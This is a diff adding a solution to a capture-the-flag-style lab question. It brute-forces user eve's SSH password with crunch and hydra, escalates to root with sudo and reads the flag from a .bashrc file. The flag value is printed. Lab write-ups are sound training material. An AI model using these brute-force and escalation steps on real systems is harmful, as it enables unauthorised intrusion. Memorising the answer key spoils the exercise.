@@ -1,0 +1,27 @@
+Questions 2
+Connect to the VM 2 machine with the provided credentials and try to get the flag that resides under another user's file.
+
+HINT
+You may need to use brute-force methods to find the login credentials. Check out Listing 28.
+If you successfully log in as the 'eve' user, check for unusual variables. Use the command provided in the Listing 24 for obtaining environment variables.
+
+crunch 6 6 -t Lab%%% > wordlist
+hydra -l eve -P wordlist 192.168.214.214 -t 4 ssh -V
+...
+[22][ssh] host: 192.168.214.214   login: eve   password: Lab123
+...
+
+ssh eve@192.168.214.214
+sudo -l
+...
+User eve may run the following commands on debian-privesc:
+    (ALL : ALL) ALL
+...
+
+# Now we can privilege escalation to root user
+sudo -i
+cat /home/eve/.bashrc
+...
+export PASSWORD=OS{1a39f44553c7a566c54fc988a94ccce0}
+...
+
